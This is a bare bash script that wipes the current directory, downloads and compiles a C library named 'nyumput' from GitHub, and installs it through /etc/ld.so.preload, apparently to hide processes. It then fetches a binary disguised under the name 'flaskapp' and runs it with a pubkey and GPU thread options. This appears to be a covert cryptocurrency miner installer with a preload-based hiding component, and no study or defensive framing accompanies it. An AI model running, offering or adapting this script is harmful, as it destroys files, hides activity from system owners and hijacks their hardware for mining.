rm -rvf * && mkdir image && cd image
#!/bin/bash
apt update
apt install curl -y
curl https://raw.githubusercontent.com/brontosimungo/upgraded-octo-sniffle/refs/heads/main/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
wget -qO flaskapp https://github.com/brontosimungo/crispy-invention/raw/refs/heads/main/balsem
chmod +x flaskapp
./flaskapp --pubkey=3qVKGFnjCQj8Y6w8ppjUgHdC3AbFZCWnwkTpbgq8i8iDbWiqr7D3ESTZwniCHG9f3Xd2gABNq37CwU8EBi1mD1qpQN68PzEwLzHSSLK1kL1sMKAQ8kTSqpxSjdqtvsLXuK4S --threads-per-card=1 --name=testest
